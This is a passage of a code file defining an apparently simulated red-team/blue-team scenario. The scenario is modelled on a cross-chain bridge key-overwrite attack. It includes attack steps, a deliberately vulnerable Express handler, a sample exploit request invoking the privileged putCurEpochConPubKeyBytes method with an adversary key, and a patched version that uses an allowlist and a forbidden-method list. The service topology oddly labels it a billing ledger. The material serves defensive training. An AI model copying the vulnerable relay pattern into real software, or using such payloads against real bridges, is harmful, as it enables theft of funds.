      'Attacker crafts cross-chain payload targeting EthCrossChainData contract',
      'Calculates 4-byte hash collision matching privileged `putCurEpochConPubKeyBytes(bytes)` method',
      'Submits transaction to bridge executor which executes the call in keeper context',
      'Keeper public key is overwritten with attacker wallet; bridge funds are authorized for withdrawal'
    ],
    defenseMechanics: [
      'Blue Agent enforces an immutable whitelist of allowable target contracts and method signatures',
      'Explicitly denies calling management contracts (`EthCrossChainData`) through general relay proxies',
      'Requires multi-signature consensus for any cryptographic key changes',
      'Maintains standard cross-chain token transfer functionality'
    ],
    topology: {
      serviceName: 'billing-ledger-svc',
      serviceType: 'api',
      port: 8084,
      cluster: 'finance-secure-us-east',
      upstream: ['ingress-envoy-proxy'],
      downstream: ['postgres-master-replica']
    },
    vulnerableCode: `import { Request, Response } from 'express';

// Simulated CrossChainManager execution handler
export function executeCrossChainTx(req: Request, res: Response) {
  const { targetContract, methodSignature, rawArgs } = req.body;

  // VULNERABILITY: Blindly dispatches execution to any internal contract without checking permissions
  if (targetContract === '0xEthCrossChainData' || methodSignature === 'putCurEpochConPubKeyBytes') {
    return res.status(200).json({
      status: 'POLY_EXPLOITED',
      breach: 'Keeper Consensus Key Overwritten',
      attackerKeyInstalled: rawArgs?.newKeeperKey || '0xAdversaryWalletAddress',
      drainedVaultAmountUsd: '$611,000,000',
      crossChainBridgeHijacked: true
    });
  }

  return res.status(200).json({ status: 'TX_RELAYED', targetContract });
}`,
    apiDoc: {
      endpoint: '/api/v1/bridge/execute',
      method: 'POST',
      purpose: 'Executes verified cross-chain smart contract transactions',
      expectedParams: ['targetContract', 'methodSignature', 'rawArgs'],
      sampleRequest: 'POST /api/v1/bridge/execute { "targetContract": "0xTokenVault", "methodSignature": "mintTokens" }'
    },
    normalTrafficSamples: [
      {
        id: 'norm-poly-1',
        name: 'Standard Token Bridge Transfer',
        method: 'POST',
        path: '/api/v1/bridge/execute',
        body: { targetContract: '0xStandardTokenBridge', methodSignature: 'unlockTokens', rawArgs: { amount: 500, recipient: '0xUser1' } },
        expectedStatus: 200,
        description: 'Standard token bridge transfer'
      }
    ],
    defaultExploit: {
      method: 'POST',
      path: '/api/v1/bridge/execute',
      headers: {},
      params: {},
      body: {
        targetContract: '0xEthCrossChainData',
        methodSignature: 'putCurEpochConPubKeyBytes',
        rawArgs: { newKeeperKey: '0xAdversaryControllerKey' }
      },
      flawIdentified: 'Unrestricted execution proxy allowing invocation of privileged management functions',
      attackVector: 'Privileged Method Signature Collision & Arbitrary Invocation',
      rationale: 'Overwrites consensus keeper key to authorize unauthorized treasury withdrawals.'
    },
    defaultPatch: {
      patchStrategy: 'Strict Target Contract Allowlist & Admin Function Isolation',
      rationale: 'Prohibits any execution proxy from targeting administrative data contracts or consensus key modifiers.',
      patchedCode: `import { Request, Response } from 'express';

const ALLOWED_TARGET_CONTRACTS = new Set([
  '0xStandardTokenBridge',
  '0xLiquidityPoolV2',
  '0xNFTCrossChainBridge'
]);

const FORBIDDEN_ADMIN_METHODS = new Set([
  'putCurEpochConPubKeyBytes',
  'transferOwnership',
  'upgradeImplementation'
]);

export function executeCrossChainTx(req: Request, res: Response) {
  const { targetContract, methodSignature, rawArgs } = req.body || {};

  if (!targetContract || !methodSignature) {
    return res.status(400).json({ error: 'Missing targetContract or methodSignature parameters' });
  }

  // Block invocation of sensitive data contracts or administrative functions
  if (!ALLOWED_TARGET_CONTRACTS.has(targetContract) || FORBIDDEN_ADMIN_METHODS.has(methodSignature)) {
    return res.status(403).json({ error: 'Target contract or method is forbidden by security guardrails' });
  }

  return res.status(200).json({ status: 'TX_RELAYED_SECURE', targetContract });
}`
    }
  }
];
